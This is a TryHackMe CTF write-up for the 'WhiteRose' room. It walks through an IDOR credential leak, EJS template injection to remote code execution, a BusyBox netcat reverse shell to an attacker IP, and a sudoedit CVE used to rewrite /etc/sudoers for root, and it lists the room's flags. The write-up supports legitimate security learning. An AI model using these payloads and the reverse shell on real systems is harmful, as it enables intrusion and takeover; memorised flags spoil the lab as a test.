#  WhiteRose

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / IDOR / SSTI / RCE / Linux PrivEsc  
> **Date Completed:** 2026-04-21
  
> **Room Link:** [https://tryhackme.com/room/whiterose](https://tryhackme.com/room/whiterose)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Privilege Escalation](#privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

##  Room Overview

A Mr. Robot / Elliot-themed CTF built around a fictional Cyprus National Bank admin portal. The chain involves subdomain enumeration, IDOR in a chat parameter to leak admin credentials, SSTI in an EJS template engine for RCE, and finally a `sudoedit` CVE to overwrite `/etc/sudoers` and escalate to root.

**Goal:**  
Find Tyrell Wellick's phone number (user flag) and capture the root flag.

**Starting Credentials (given by the room):** `Olivia Cortez:olivi8`

**Skills Practiced:**  
Nmap scanning, subdomain fuzzing with wfuzz, IDOR via URL parameter, EJS Server-Side Template Injection (SSTI), BusyBox netcat reverse shell, TTY stabilisation, `sudoedit` privilege escalation via `EDITOR` environment variable.

---

##  Reconnaissance

### Network Scanning

```bash
nmap 10.49.168.29 -sV -v
```

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| 80   | HTTP    | nginx 1.14.0 (Ubuntu) |

### Adding to `/etc/hosts`

```bash
echo "10.49.168.29 cyprusbank.thm" >> /etc/hosts
```

The base domain (`http://cyprusbank.thm/`) shows only a maintenance page. Gobuster against the base domain finds nothing useful.

---

##  Enumeration

### Subdomain Fuzzing

```bash
wfuzz -u http://10.49.168.29 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.cyprusbank.thm" \
  --hc 400,404 -t 150 -c --hh 57
```

**Findings:**

| Subdomain | Status | Note |
|-----------|--------|------|
| `www` | 200 | Default page |
| `admin` | 302 | Admin panel — redirects |

```bash
echo "10.49.168.29 admin.cyprusbank.thm" >> /etc/hosts
```

### Admin Panel Login

Navigating to `http://admin.cyprusbank.thm/` shows a login page. The room-provided credentials work immediately:

```
Username: Olivia Cortez
Password: olivi8
```

### Dashboard Overview

After login, the dashboard displays bank statements and a customer list with **phone numbers hidden** (`***-***-***`). The messages section is accessible at:

```
http://admin.cyprusbank.thm/messages/?c=5
```

### IDOR — Chat Parameter

The `?c=5` parameter controls which chat page is loaded. Changing it to `?c=0`:

```
http://admin.cyprusbank.thm/messages/?c=0
```

Reveals an earlier admin conversation where credentials are shared in plaintext:

```
DEV TEAM: Thanks Gayle, can you share your credentials?
Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
```

**Credentials found: `Gayle Bev` / `p~]P@5!6;rs558:q`**

### Escalated Access as Gayle Bev

Logging in as Gayle Bev unlocks:
- **Visible phone numbers** for all customers
- **Settings page** — unavailable to Olivia Cortez

**Tyrell Wellick's phone number (Flag 1): `842-029-5701`**

---

##  Exploitation

### Vulnerability

**Type:** Server-Side Template Injection (SSTI) in EJS template engine  
**CVE:** N/A  
**Description:**  
The Settings page passes user-supplied input (the `name` parameter) directly into an EJS template. Removing the `password` parameter from the POST request triggers a verbose server error revealing the `.ejs` extension and the file path. EJS is vulnerable to SSTI, allowing arbitrary JavaScript execution via `process.mainModule.require('child_process').execSync()`.

---

### Steps

**Step 1 — Discover the SSTI vector**

Intercepting the Settings POST request in Burp Suite and removing the `password` parameter causes a server error:

```
ReferenceError: /home/web/app/views/settings.ejs
```

This confirms EJS templating is in use.

**Step 2 — Confirm RCE**

Inject an SSTI payload into the `name` parameter:

```
name=<%25%3d+global.process.mainModule.require('child_process').execSync('whoami')+%25>
```

Response confirms execution as user `web`.

**Step 3 — Establish a reverse shell via BusyBox**

Standard netcat's `-e` flag is disabled on this machine. Use BusyBox netcat instead:

Start the listener on the attacker machine:

```bash
nc -lvp 4444
```

Payload in the `name` parameter:

```
name=<%25%3d+global.process.mainModule.require('child_process').execSync('busybox+nc+<YOUR_IP>+4444+-e+/bin/bash')+%25>
```

Shell received as `web`. 

**Step 4 — Stabilise the TTY**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Press `Ctrl+Z` to background, then:

```bash
stty raw -echo; fg
```

Type `reset`, press Enter, then `Ctrl+C` to get a fully interactive shell.

**Step 5 — User Flag**

```bash
cat ~/user.txt
```

---

##  Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

Output shows `web` can run `sudoedit` on a specific file as root.

### sudoedit — `/etc/sudoers` Overwrite

`sudoedit` respects the `EDITOR` environment variable and can be tricked into editing a **different file** by appending `-- /path/to/target` to the editor command. This is a known vulnerability in older versions of `sudo`.

**Step 1 — Set the EDITOR to open `/etc/sudoers`**

```bash
export EDITOR="nano -- /etc/sudoers"
```

**Step 2 — Trigger sudoedit**

```bash
sudo sudoedit <the permitted file>
```

`nano` opens `/etc/sudoers` with root privileges.

**Step 3 — Add full sudo access for `web`**

Under the `## User privilege specification` section, add:

```
web ALL=(ALL:ALL) NOPASSWD: ALL
```

Save and exit nano (`Ctrl+X → Y → Enter`).

**Step 4 — Escalate to root**

```bash
sudo bash
```

Root shell obtained. 

**Step 5 — Root Flag**

```bash
cat /root/root.txt
```

---

##  Flags

| Flag | Value |
|------|-------|
| User Flag (Tyrell's phone) | `842-029-5701` |
| user.txt | `THM{4lways_upd4te_uR_d3p3nd3nc!3s}` |
| root.txt | `THM{4nd_uR_p4ck4g3s}` |

---

##  Key Takeaways

- **IDOR in a simple `?c=` parameter exposed admin credentials.** Changing a single integer in the URL bypassed all access control on the chat history. Always enforce server-side authorisation on every record — never trust client-supplied IDs alone.
- **Never share credentials in chat — even internal chat.** The Gayle Bev credentials were sitting in plaintext in a chat log accessible via IDOR. Treat internal messaging systems as potentially compromised.
- **EJS SSTI is a well-documented RCE vector.** User input should never be rendered directly in a template. Always sanitise and use safe rendering methods.
- **BusyBox is a reliable fallback when netcat's `-e` flag is unavailable.** It's pre-installed on most Linux distros and provides a compatible netcat implementation.
- **`sudoedit` + `EDITOR` environment variable = arbitrary file write as root.** This is a real CVE (CVE-2023-22809 in sudo < 1.9.12p2). Always keep `sudo` patched and restrict `sudoedit` access carefully.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port & service scanning |
| wfuzz | Subdomain enumeration |
| Gobuster | Directory enumeration |
| Browser / Manual IDOR | Chat parameter manipulation (`?c=0`) |
| Burp Suite | Intercepting & modifying Settings POST request |
| EJS SSTI payload | Remote code execution |
| BusyBox netcat | Reverse shell (bypassing `-e` flag restriction) |
| `sudoedit` + EDITOR trick | Overwriting `/etc/sudoers` for root access |

---

##  References

- [CVE-2023-22809 — sudoedit Privilege Escalation](https://www.synacktiv.com/en/publications/sudoedit-bypass-in-sudo-before-1912p2)
- [HackTricks — EJS SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ejs)
- [OWASP — IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [BusyBox Netcat](https://busybox.net/)

---

*Writeup by Avaneesh*
